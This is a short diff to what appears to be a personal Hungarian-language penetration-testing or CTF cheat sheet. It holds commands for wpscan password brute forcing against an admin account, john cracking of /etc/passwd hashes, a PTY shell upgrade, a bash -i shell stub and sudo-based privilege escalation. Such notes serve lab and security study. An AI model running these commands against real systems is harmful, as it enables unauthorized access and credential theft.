@@ -36,6 +36,7 @@ python3 -c "import pty; pty.spawn('/bin/bash')"
 
 wpscan --url <url> -e at,ap,u
 wpscan --url <url> -U <talált_username> -P /usr/share/wordlists/rockyou.txt
+sudo wpscan --url <url> --usernames admin --passwords /usr/share/wordlists/rockyou.txt
 
 john </etc/passwd key> --wordlist=/usr/share/wordlists/rockyou.txt 
 john </etc/passwd key> --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt $y$
@@ -72,4 +73,11 @@ ignore
 /usr/sbin/lprm
 
 df -> lemezkimenet
+
+#!/bin/sh
+bash -i
+
+fájl futtatása más ember jogosultságával: sudo -u <másik felhasználó neve> <sudo -l által kilistázott EGÉSZ SOR>
+https://drive.google.com/drive/folders/1pAPH6c5MFAJhJIpG6w88XulvNG5qrfBm
+
 
